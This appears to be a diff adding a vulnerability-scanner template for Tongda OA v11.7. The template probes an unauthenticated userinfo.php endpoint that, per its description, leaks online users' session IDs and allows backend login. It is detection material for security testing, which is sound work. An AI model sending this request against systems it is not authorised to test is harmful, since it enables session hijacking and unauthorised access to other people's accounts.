@@ -1,0 +1,32 @@
+id: tongda-session-disclosure
+info:
+  name: Tongda User Session Disclosure
+  author:
+  - l0ne1y
+  description: |-
+    Tongda OA v11.7 Online User Login Vulnerability
+    Due to improper permission controls in the web program, users can access or operate on data they are not authorized to access, i.e., unauthorized access. Tongda OA v11.7 has an interface that can query online users without authorization; when a user is online, it returns their PHPSESSION, allowing login to the backend system.
+  severity: medium
+  remediation: |-
+    #### Official remediation:
+    Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - '"dept_name":"'
+    - '"online_flag":'
+  - type: word
+    condition: and
+    part: header
+    words:
+    - application/json
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/general/userinfo.php?UID=1'
+  method: POST
